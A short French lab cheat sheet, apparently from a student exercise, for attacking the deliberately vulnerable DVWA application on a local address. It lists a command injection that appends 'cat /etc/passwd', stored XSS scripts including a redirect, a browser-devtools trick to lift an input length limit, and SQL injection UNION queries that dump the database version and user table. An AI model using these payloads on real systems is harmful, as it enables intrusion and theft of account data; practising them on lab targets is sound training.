# Consignes sur DVWA

## command injection : http://192.168.4.124/dvwa/vulnerabilities/exec/
	8.8.8.8
	8.8.8.8 && cat /etc/passwd

## XSS (Stored) 
## faille de sécurité qui permet à un attaquant d'injecter dans un site web un code client malveillant
	<script>alert('stored XSS');</script>

	<script>window.location='https://www.eseo.fr/'</script>
	# Cela ne marche pas il faut modifier le code sur le navigateur pour que cela marche.
		- Shift + CTRL + J
		- html -> body -> main-body -> body-padded -> vulnerable_code_area -> post -> 2em tr -> td
		- changer maxlenght de 50 en 150 pour coller le code qui va bien
	# Pour récupérer cela passer en mode security impossible pour faire ensuite le clear guestbook


## Injection SQL 
## Idem mais dans du code SQL sous jacent.

1' OR '1=1
1' OR 1=1 UNION SELECT null,version()#
1' OR 1=1 UNION SELECT null,USER();#
1' OR 1=1 UNION SELECT null,user FROM mysql.user#
